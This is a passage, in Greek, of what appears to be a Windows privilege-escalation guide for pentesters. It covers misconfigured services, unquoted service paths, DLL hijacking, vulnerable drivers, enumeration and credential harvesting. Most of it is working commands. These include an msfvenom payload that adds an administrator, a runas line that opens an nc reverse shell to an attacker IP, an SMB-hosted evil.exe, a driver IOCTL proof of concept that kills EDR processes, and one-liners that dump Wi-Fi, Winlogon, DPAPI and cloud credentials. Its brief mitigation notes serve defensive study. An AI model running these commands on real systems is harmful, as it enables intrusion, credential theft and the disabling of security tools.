get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Αν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να αλλαχθεί.

Για να αλλάξετε το Path του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Δικαιώματα AppendData/AddSubdirectory στο μητρώο υπηρεσιών

Αν έχετε αυτό το δικαίωμα πάνω σε ένα μητρώο, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπο-μητρώα από αυτό**. Στην περίπτωση των Windows services αυτό είναι **αρκετό για την εκτέλεση αυθαίρετου κώδικα:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Εάν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Καταγράψτε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρώντας αυτές που ανήκουν σε ενσωματωμένες υπηρεσίες Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα ληφθούν εάν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Εάν αυτό το binary είναι αντικαταστάσιμο, ίσως είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Ελέγξτε τα **δικαιώματα των binaries** (ίσως να μπορείτε να αντικαταστήσετε κάποιο και να escalate privileges) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο config file για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από έναν λογαριασμό Administrator (schedtasks).

Ένας τρόπος για να βρείτε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι να κάνετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Το Notepad++ φορτώνει αυτόματα οποιοδήποτε plugin DLL στους υποφακέλους `plugins`. Εάν υπάρχει εγγράψιμη φορητή/αντιγραμμένη εγκατάσταση, η τοποθέτηση ενός κακόβουλου plugin παρέχει αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένου από το `DllMain` και plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα για ενδιαφέρουσες **autoruns locations για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **περίεργους/ευάλωτους** οδηγούς τρίτων
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Εάν ένας driver αποκαλύπτει ένα arbitrary kernel read/write primitive (συνηθισμένο σε κακώς σχεδιασμένους IOCTL handlers), μπορείτε να αυξήσετε τα προνόμια κλέβοντας ένα SYSTEM token απευθείας από τη kernel memory. Δείτε την τεχνική βήμα‑βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για race-condition bugs όπου η ευάλωτη κλήση ανοίγει ένα attacker-controlled Object Manager path, η εσκεμμένη επιβράδυνση του lookup (χρησιμοποιώντας max-length components ή deep directory chains) μπορεί να επεκτείνει το παράθυρο από microseconds σε tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive primitives διαφθοράς μνήμης

Οι σύγχρονες hive ευπάθειες σάς επιτρέπουν να groom deterministic layouts, να καταχραστείτε writable HKLM/HKU descendants, και να μετατρέψετε metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθετε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Κατάχρηση της απουσίας FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Ορισμένοι signed third‑party drivers δημιουργούν το device object τους με ένα ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να ορίσουν FILE_DEVICE_SECURE_OPEN σε DeviceCharacteristics. Χωρίς αυτή τη σημαία, το secure DACL δεν εφαρμόζεται όταν η συσκευή ανοίγεται μέσω ενός path που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε χωρίς δικαιώματα χρήστη να αποκτήσει ένα handle χρησιμοποιώντας ένα namespace path όπως:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Μόλις ένας χρήστης μπορεί να ανοίξει τη συσκευή, τα privileged IOCTLs που εκτίθενται από τον driver μπορούν να καταχραστούν για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στο wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Ελάχιστο πρότυπο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Μέτρα μετριασμού για προγραμματιστές
- Να ορίζετε πάντα FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε αντικείμενα συσκευών που προορίζονται να περιοριστούν από DACL.
- Επαληθεύστε το πλαίσιο του καλούντος για προνομιακές λειτουργίες. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασίας ή την επιστροφή handle.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε brokered models αντί για direct kernel privileges.

Ιδέες ανίχνευσης για τους αμυνόμενους
- Παρακολουθήστε user-mode ανοίγματα ύποπτων ονομάτων συσκευών (π.χ., \\ .\\amsdk*) και συγκεκριμένες αλληλουχίες IOCTL που υποδηλώνουν κατάχρηση.
- Επιβάλετε το Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) και διατηρήστε δικές σας allow/deny lists.


## PATH DLL Hijacking

Αν έχετε **write permissions μέσα σε έναν φάκελο που βρίσκεται στο PATH** μπορεί να μπορείτε να hijack μια DLL που φορτώνει μια διεργασία και να **escalate privileges**.

Ελέγξτε τα δικαιώματα όλων των φακέλων που είναι στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Δείτε αυτή τη σελίδα για εντολές σχετικές με Firewall**](../basic-cmd-for-pentesters.md#firewall) **(εμφάνιση κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερα[ εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το δυαδικό αρχείο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσεις root user, μπορείς να ακούς σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσεις `nc.exe` για να ακούσει σε μια θύρα, θα ρωτήσει μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Διαχείριση διαπιστευτηρίων / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει τα διαπιστευτήρια χρηστών για διακομιστές, ιστοσελίδες και άλλα προγράμματα που το **Windows** μπορεί να **συνδέει αυτόματα τους χρήστες**. Στην πρώτη ανάγνωση, αυτό μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύσουν τα Facebook credentials, Twitter credentials, Gmail credentials κ.λπ., ώστε να συνδέονται αυτόματα μέσω browsers. Αλλά δεν συμβαίνει έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια που το Windows μπορεί να χρησιμοποιήσει για να συνδέει αυτόματα τους χρήστες, που σημαίνει ότι οποιαδήποτε **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault και να χρησιμοποιήσει τα διαπιστευτήρια που παρέχονται αντί οι χρήστες να πληκτρολογούν το username και το password κάθε φορά.

Εκτός εάν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι είναι δυνατόν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Έτσι, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει κάπως να **communicate with the credential manager and request the credentials for that resource** από το προεπιλεγμένο αποθηκευτικό vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα credentials. Το παρακάτω παράδειγμα καλεί ένα remote binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ή από [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Η **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος για να συνεισφέρει σημαντικά στην εντροπία.

**DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προέρχεται από τα μυστικά εισόδου του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά αυθεντικοποίησης domain του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, μέσω DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου `{SID}` αντιπροσωπεύει το χρήστη's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Το κλειδί DPAPI, που συνυπάρχει με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Σημειώστε ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, εμποδίζοντας την απαρίθμηση του περιεχομένου του με την εντολή `dir` στο CMD, αν και μπορεί να απαριθμηθεί μέσω του PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να **decrypt**.\
Μπορείτε να **extract many DPAPI** **masterkeys** από τη **memory** με το `sekurlsa::dpapi` module (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Οι **PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και εργασίες automation ως τρόπος να αποθηκεύονται κρυπτογραφημένα credentials με ευκολία. Τα credentials προστατεύονται χρησιμοποιώντας **DPAPI**, που συνήθως σημαίνει ότι μπορούν να **decrypt** μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **decrypt** ένα PS credentials από το αρχείο που το περιέχει μπορείτε να κάνετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατες Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής Διαπιστευτηρίων Απομακρυσμένης Επιφάνειας Εργασίας**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε αρχεία .rdg**\
Μπορείτε να **εξάγετε πολλά DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Οι χρήστες συχνά χρησιμοποιούν την εφαρμογή StickyNotes σε σταθμούς εργασίας Windows για να **αποθηκεύουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι πρόκειται για αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητήσετε και να το εξετάσετε.

### AppCmd.exe

**Σημείωση ότι για να ανακτήσετε κωδικούς από AppCmd.exe πρέπει να είστε Administrator και να τρέχειτε σε High Integrity επίπεδο.**\
**AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\  
Εάν αυτό το αρχείο υπάρχει, είναι πιθανό ότι έχουν ρυθμιστεί κάποια **credentials** και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι εγκαταστάτες εκτελούνται με **run with SYSTEM privileges**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Κλειδιά Host
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH κλειδιά στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκευτούν στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί μέσα:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε καταχώρηση μέσα σε αυτή τη διαδρομή, πιθανότατα θα είναι ένα αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν τρέχει και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, τρέξτε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με `ssh-add` και να κάνω login μέσω ssh σε μια μηχανή. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρα κλειδιά.

### Αρχεία unattended
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Αποθηκευμένος κωδικός GPP

